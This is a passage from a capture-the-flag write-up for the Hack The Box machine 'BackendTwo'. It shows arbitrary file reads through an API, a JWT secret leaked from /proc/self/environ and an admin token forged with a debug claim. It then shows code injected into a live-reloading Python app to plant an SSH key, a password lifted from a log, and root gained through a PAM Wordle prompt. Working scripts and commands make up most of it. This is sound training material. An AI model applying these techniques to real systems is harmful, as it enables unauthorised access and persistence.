systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
```

</p></details>

I got `/etc/passwd` also.
`htb` user is there.

### Upload file Feature

![swagger-ui-post-file.png](swagger-ui-post-file.png)

There is endpoint which can write files on the server, so I try this.
The request body is sent as JSON in the format `{"file": "string"}`.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/file/dGVzdC50eHQ= -H "Content-Type: application/json" -d '{"file":"a"}'
{"detail":"Debug key missing from JWT"}
```

An error was returned that JWT does not have a Debug key.

I don't know if the payload is being verified on the server side, but I try to rewrite the JWT payload and request again.

```console
root@kali:~/htb/Machines/BackendTwo# python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN -I -pc Debug -pv true
(snip)
Original JWT:

jwttool_02fb5855471116ce6a093baae327cc5a - Injected token with unchanged signature
[+] eyJ(snip)4nk

root@kali:~/htb/Machines/BackendTwo# TOKEN=eyJ(snip)4nk

root@kali:~/htb/Machines/BackendTwo# curl -X POST -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/file/dGVzdC50eHQ= -H "Content-Type: application/json" -d '{"file":"a"}'
{"detail":"Could not validate credentials"}
```

An error was returned indicating that the authentication information could not be verified.
I think the JWT is correctly verified on the server side.

Since I can get the file, I may be able to create a JWT in kali machine if I can see the JWT encoding process in this API.
I try to get the source code using the GET `/api/v1/admin/file/{file_name}` endpoint.

### Enumeration /proc/{pid}/cmdline

At this time, specific files can be gotten, but directory listings are not available.
Not knowing what directory the source code is located in, I look at the process of what command the web application is running.

```console
root@kali:~/htb/Machines/BackendTwo# python3 file.py get_file -f /proc/self/cmdline
/usr/bin/python3-cfrom multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)--multiprocessing-fork
```

There is no information about the source code location.
It seems possible to look at files under `/proc/`, so I will enumerate `/proc/{pid}/cmdline`.

To save execution time, I can use Python's [ThreadPoolExecutor](https://docs.python.org/3/library/concurrent.futures.html#concurrent.futures.ThreadPoolExecutor) to get `/proc/{pid}/cmdline`.

<details><summary>part of file.py</summary><p>

```python
    elif args.action == "proc_enum":
        with ThreadPoolExecutor(max_workers=100) as executor:
            for i in range(1, 9999):
                file = f"/proc/{i}/cmdline"
                executor.submit(get_file, file)
```

</p></details>

```console
root@kali:~/htb/Machines/BackendTwo# python3 file.py proc_enum
(snip)
/usr/sbin/runuser-uhtb--/home/htb/run.sh
(snip)

root@kali:~/htb/Machines/BackendTwo# python3 file.py get_file -f /home/htb/run.sh
```

<details><summary>/home/htb/run.sh</summary><p>

```shell
#!/bin/sh

cd /home/htb/
export APP_MODULE=${APP_MODULE-app.main:app}
export API_KEY=$(echo $RANDOM | md5sum | head -c 32)
export HOST=${HOST:-0.0.0.0}
export PORT=${PORT:-80}

exec /home/htb/.local/bin/uvicorn --reload --host $HOST --port $PORT "$APP_MODULE"
```

</p></details>

There was the process with the command `/usr/sbin/runuser -u htb -- /home/htb/run.sh`.
The `/home/htb/run.sh` file shows [Uvicorn](https://www.uvicorn.org/) running in the module `app.main` in the htb user's home directory `/home/htb`, so the code is in `/home/htb/app/main.py`.
I was able to get main.py by running the command `python3 file.py get_file -f /home/htb/app/main.py`.

### Get and Review Source Code

JWT is encoded at login, so I look at the code around it.

part of /home/htb/app/main.py

```python
from app.api.v1.api import api_router
from app.core.config import settings

# (snip)

app.include_router(api_router, prefix=settings.API_V1_STR)
```

/home/htb/app/api/v1/api.py

```python
from fastapi import APIRouter

from app.api.v1.endpoints import user, admin


api_router = APIRouter()
api_router.include_router(user.router, prefix="/user", tags=["user"])
api_router.include_router(admin.router, prefix="/admin", tags=["admin"])
```

part of /home/htb/app/api/v1/endpoints/admin.py

```python
@router.post("/file/{file_name}", status_code=200)
def write_file(
    file_name: str,
    write_file: WriteFile,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    """
    Writes a file on the server. File name input is encoded in base64_url
    """
    if not current_user['is_superuser']:
        raise HTTPException(status_code=400, detail="Not a admin")

    if "debug" not in current_user.keys():
        raise HTTPException(status_code=400, detail="Debug key missing from JWT")

    import base64

    file_name = base64.urlsafe_b64decode(file_name.encode("utf-8") + b'=' * (4 - len(file_name) % 4))
    file_name = file_name.decode()

    try:
        with open(file_name, "w") as f:
            f.write(write_file.file)
            f.close()
    except:
        raise HTTPException(status_code=400, detail="Unknown Error")

    return {"result": "success"}
```

part of /home/htb/app/api/v1/endpoints/user.py

```python
# (snip)

from app.core.auth import (
    authenticate,
    create_access_token,
)

router = APIRouter()

# (snip)

@router.post("/login")
def login(db: Session = Depends(deps.get_db),
    form_data: OAuth2PasswordRequestForm = Depends()
) -> Any:
    """
    Get the JWT for a user with data from OAuth2 request form body.
    """

    timestamp = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
    user = authenticate(email=form_data.username, password=form_data.password, db=db)
    if not user:
        with open("auth.log", "a") as f:
            f.write(f"{timestamp} - Login Failure for {form_data.username}\n")
        raise HTTPException(status_code=400, detail="Incorrect username or password")

    with open("auth.log", "a") as f:
            f.write(f"{timestamp} - Login Success for {form_data.username}\n")

    return {
        "access_token": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),
        "token_type": "bearer",
    }
```

part of /home/htb/app/core/auth.py

```python
from typing import Optional, MutableMapping, List, Union
from datetime import datetime, timedelta

from fastapi.security import OAuth2PasswordBearer
from sqlalchemy.orm.session import Session
from jose import jwt

from app.models.user import User
from app.core.config import settings
from app.core.security import verify_password

# (snip)

def create_access_token(*,
    sub: str,
    guid: str,
    is_superuser: bool
) -> str:
    return _create_token(
        token_type="access_token",
        lifetime=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        sub=sub,
        guid=guid,
        is_superuser=is_superuser
    )


def _create_token(
    token_type: str,
    lifetime: timedelta,
    sub: str,
    guid: str,
    is_superuser: bool
) -> str:
    payload = {}
    expire = datetime.utcnow() + lifetime
    payload["type"] = token_type

    # https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.3
    # The "exp" (expiration time) claim identifies the expiration time on
    # or after which the JWT MUST NOT be accepted for processing
    payload["exp"] = expire

    # The "iat" (issued at) claim identifies the time at which the
    # JWT was issued.
    payload["iat"] = datetime.utcnow()

    # The "sub" (subject) claim identifies the principal that is the
    # subject of the JWT
    payload["sub"] = str(sub)
    payload["is_superuser"] = bool(is_superuser)
    payload["guid"] = str(guid)
    return jwt.encode(payload, settings.JWT_SECRET, algorithm=settings.ALGORITHM)
```

/home/htb/app/core/config.py

```python
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

import os
from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = os.environ['API_KEY']
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"

    class Config:
        case_sensitive = True


settings = Settings()
```

Review Summary:

- JWT is encoded by [python-jose](https://github.com/mpdavis/python-jose).
- JWT algorithm is HS256.
- JWT is encoded with the `API_KEY` environment variable as a key.
- If JWT has a payload `debug`, I can write files with the POST `/api/v1/admin/file/{file_name}` endpoint.

### Encode JWT with Debug key

Having The `API_KEY` environment variable, I generate JWT in kali machines and insert arbitrary payload claim.
The environment variable can be obtained from `/proc/self/environ`.

/proc/self/environ

```text
USER=htbHOME=/home/htbOLDPWD=/PORT=80LOGNAME=htbJOURNAL_STREAM=9:18867APP_MODULE=app.main:appPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=249b46476fca4ad18c5fca3dff9485d9LANG=C.UTF-8API_KEY=68b329da9893e34099c7d8ad5cb9c940HOST=0.0.0.0PWD=/home/htb
```

Got `API_KEY=68b329da9893e34099c7d8ad5cb9c94`.
Refering to `/home/htb/app/core/auth.py`, I implement script encode_jwt.py.

<details><summary>encode_jwt.py</summary><p>

```python
from jose import jwt
from datetime import datetime, timedelta


def create_access_token(*, sub: str, guid: str, is_superuser: bool) -> str:
    return _create_token(
        token_type="access_token",
        lifetime=timedelta(minutes=60 * 24 * 8),
        sub=sub,
        guid=guid,
        is_superuser=is_superuser,
    )


def _create_token(
    token_type: str, lifetime: timedelta, sub: str, guid: str, is_superuser: bool
) -> str:
    payload = {}
    expire = datetime.utcnow() + lifetime
    payload["type"] = token_type

    # https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.3
    # The "exp" (expiration time) claim identifies the expiration time on
    # or after which the JWT MUST NOT be accepted for processing
    payload["exp"] = expire

    # The "iat" (issued at) claim identifies the time at which the
    # JWT was issued.
    payload["iat"] = datetime.utcnow()

    # The "sub" (subject) claim identifies the principal that is the
    # subject of the JWT
    payload["sub"] = str(sub)
    payload["is_superuser"] = bool(is_superuser)
    payload["guid"] = str(guid)

    payload["debug"] = True  # append this

    return jwt.encode(payload, "68b329da9893e34099c7d8ad5cb9c940", algorithm="HS256")


print(
    create_access_token(
        sub=12,
        is_superuser=True,
        guid="9e901212-05af-42e4-aa9c-5d8ceb43dec8",
    )
)
```

</p></details>

The `sub` and `guid` are user-specific values.

<details><summary>In this case, They are `12`, `9e901212-05af-42e4-aa9c-5d8ceb43dec8` respectively.</summary><p>

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/user/12
{"guid":"9e901212-05af-42e4-aa9c-5d8ceb43dec8",(snip),"id":12}
```

</p></details>

Executing this script to generate JWT and request POST `/api/v1/admin/file/{file_name}` endpoint.

```console
root@kali:~/htb/Machines/BackendTwo# python3 encode_jwt.py
eyJ(snip)stc

root@kali:~/htb/Machines/BackendTwo# TOKEN=eyJ(snip)stc

root@kali:~/htb/Machines/BackendTwo# echo -ne '/home/htb/test.txt' | base64
L2hvbWUvaHRiL3Rlc3QudHh0

root@kali:~/htb/Machines/BackendTwo# curl -X POST -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/file/L2hvbWUvaHRiL3Rlc3QudHh0 -H "Content-Type: application/json" -d '{"file":"pwn"}'
{"result":"success"}

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/file/L2hvbWUvaHRiL3Rlc3QudHh0 -H "Content-Type: application/json"
{"file":"pwn"}
```

I could write `pwn` to the file `/home/htb/test.txt`.

I implemented the process of uploading also.

<details><summary>part of file.py</summary><p>

```python
def post_file(filename: str, content: str) -> None:
    base64encoded_file = base64.b64encode(filename.encode()).decode()

    headers = {"Authorization": f"Bearer {TOKEN}"}

    res = s.post(
        f"http://{HOST}/api/v1/admin/file/{base64encoded_file}",
        headers=headers,
        json={"file": content},
    )
    print(f"{res.status_code=}, {res.content}")


if __name__ == "__main__":
# (snip)
    elif args.action == "send_content":
        post_file(args.filename, args.content)

    elif args.action == "send_file":
        with open(args.local_filename, "r") as f:
            post_file(args.filename, f.read())
```

</p></details>

### Foothold: Modifying source code

In `/home/htb/run.sh`, `exec /home/htb/.local/bin/uvicorn --reload --host $HOST --port $PORT "$APP_MODULE"` is executed.
The `--reload` option seems to be an option for development use, it detects changes in the source code and restart the server process.

[Settings - Uvicorn](https://www.uvicorn.org/settings/#development)

> --reload - Enable auto-reload. Uvicorn supports two versions of auto-reloading behavior enabled by this option. There are important differences between them.

Normally, if we just rewrite the source code, the server process will not read the modified source code, so will not be able to execute arbitrary code.
This time, however, I can use this option to execute arbitrary code.

Let's create the `/home/htb/.ssh` directory and have the process execute a command to write the public key to the authorized_keys file.

```console
root@kali:~/htb/Machines/BackendTwo# python3 file.py get_file -f /home/htb/app/main.py > main.py.org

root@kali:~/htb/Machines/BackendTwo# cp main.py.org main.py

root@kali:~/htb/Machines/BackendTwo# vi main.py

root@kali:~/htb/Machines/BackendTwo# diff main.py{,.org}
4,7d3
< os.system(
<     "mkdir /home/htb/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOwZ4e30dPFfyNyZX1abjKMgj3ZH/7x5ijkMIjwx0HLF kali@kali' >> /home/htb/.ssh/authorized_keys"
< )
<

root@kali:~/htb/Machines/BackendTwo# python3 file.py send_file -f /home/htb/app/main.py -l main.py
res.status_code=200, b'{"result":"success"}'

root@kali:~/htb/Machines/BackendTwo# ssh htb@backendtwo.htb
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug  1 10:49:16 2023 from 10.10.16.11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@BackendTwo:~$
```

SSH login was succeeded.

### Foothold: Using password in `auth.log`

Aside from storing the public key on the server and logging in via SSH, I can use the password in the `/home/htb/auth.log` file.

<details><summary>part of /home/htb/app/api/v1/endpoints/user.py</summary><p>

```python
@router.post("/login")
def login(db: Session = Depends(deps.get_db),
    form_data: OAuth2PasswordRequestForm = Depends()
) -> Any:
    """
    Get the JWT for a user with data from OAuth2 request form body.
    """

    timestamp = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
    user = authenticate(email=form_data.username, password=form_data.password, db=db)
    if not user:
        with open("auth.log", "a") as f:
            f.write(f"{timestamp} - Login Failure for {form_data.username}\n")
        raise HTTPException(status_code=400, detail="Incorrect username or password")

    with open("auth.log", "a") as f:
            f.write(f"{timestamp} - Login Success for {form_data.username}\n")

    return {
        "access_token": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),
        "token_type": "bearer",
    }
```

</p></details>

The auth.log file records the login status.

```console
root@kali:~/htb/Machines/BackendTwo# python3 file.py get_file -f /home/htb/auth.log

08/01/2023, 03:27:34 - Login Success for admin@htb.local
(snip)
08/01/2023, 04:34:14 - Login Failure for 1qaz2wsx_htb!
```

There is a record of a successful login with the email address `admin@htb.local`.
Perhaps admin user typed its password in the email address field, and the log records a string that looks like a password.

Since the htb user uses the same password, it is possible to use this as the password to SSH in as the htb user.

```console
root@kali:~/htb/Machines/BackendTwo# ssh -o PubkeyAuthentication=no htb@backendtwo.htb  # enter 1qaz2wsx_htb!
```

## Root

```console
htb@BackendTwo:~$ cat /etc/group | grep htb
adm:x:4:syslog,htb
cdrom:x:24:htb
sudo:x:27:htb
dip:x:30:htb
plugdev:x:46:htb
lxd:x:116:htb
htb:x:1000:
```

The htb user belongs to the sudo group.
Since `sudo` can be executed, it is possible to escalate to the root user.

```console
htb@BackendTwo:~$ sudo su
[sudo] password for htb:
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word:
```

`PAM-Wordle!` game begins.
It seems that I should complete this game to escalation to the root.

```console
Word: a
Invalid guess: guess length != word length.
```

Reading the rules, I must enter a lowercase English word with a length of 5 characters.

```console
Word: apple
Invalid guess: unknown word.
Word: abuse
Invalid guess: unknown word.
Word: crack
Invalid guess: unknown word.
```

The number of attempts does not change even though the appropriate word is entered.

This may be implemented in the PAM module, since it's added an optional feature during authentication.
The original code may be somewhere, so run `grep` on the output error message.

```console
htb@BackendTwo:~$ grep 'guess length != word length.' -R / 2>/dev/null
Binary file /lib/x86_64-linux-gnu/security/pam_wordle.so matches
```

Found.
Download it to the kali machine and decompile it with Ghidra.

```console
root@kali:~/htb/Machines/BackendTwo# file pam_wordle.so
pam_wordle.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped

root@kali:~/htb/Machines/BackendTwo# readelf -s pam_wordle.so
(snip)
Symbol table '.symtab' contains 36 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
(snip)
    29: 000000000000134f   951 FUNC    GLOBAL DEFAULT    8 wordle_guess
    30: 0000000000004088    12 OBJECT  GLOBAL DEFAULT   14 DICT
(snip)
```

part of wordle_guess function

```c
    if (sVar5 == sVar4) {
      apcStack_a0[0] = (char *)0x1013f0;
      local_80 = check_word(DICT,apcStack_a0[3]);
      if (local_80 == 1) {
        local_4c = 1;
      }
      else if (local_80 == 0) {
        apcStack_a0[0] = (char *)0x101430;
        pam_prompt(apcStack_a0[2],4,0,"Invalid guess: unknown word.");
      }
      else {
        apcStack_a0[0] = (char *)0x101457;
        pam_prompt(apcStack_a0[2],4,0,"Warning: error reading dictionary.");
        local_4c = 1;
      }
    }
```

Looking at the wordle_guess function, the DICT variable is the string `/opt/.words`.

```console
htb@BackendTwo:~$ file /opt/.words
/opt/.words: C source, ASCII text

htb@BackendTwo:~$ wc -l /opt/.words
74 /opt/.words

htb@BackendTwo:~$ head /opt/.words
write
close
fstat
lstat
lseek
ioctl
readv
msync
shmat
pause
```

It is likely to be compared to the words in this file.
The number of words is 74 at most, and the hints are output so that the puzzle can be solved manually by running it several times.

```console
htb@BackendTwo:~$ sudo su
[sudo] password for htb:
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: write
Hint->??i??
--- Attempt 2 of 6 ---
Word: wait4
\Hint->??i??
--- Attempt 3 of 6 ---
Word: utime
Hint->u?i??
--- Attempt 4 of 6 ---
Word: union
Correct!
root@BackendTwo:/home/htb# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flag

user

```console
htb@BackendTwo:~$ cat /home/htb/user.txt
[REDACTED]
```

root

```console
root@BackendTwo:/home/htb# cat /root/root.txt
[REDACTED]
```
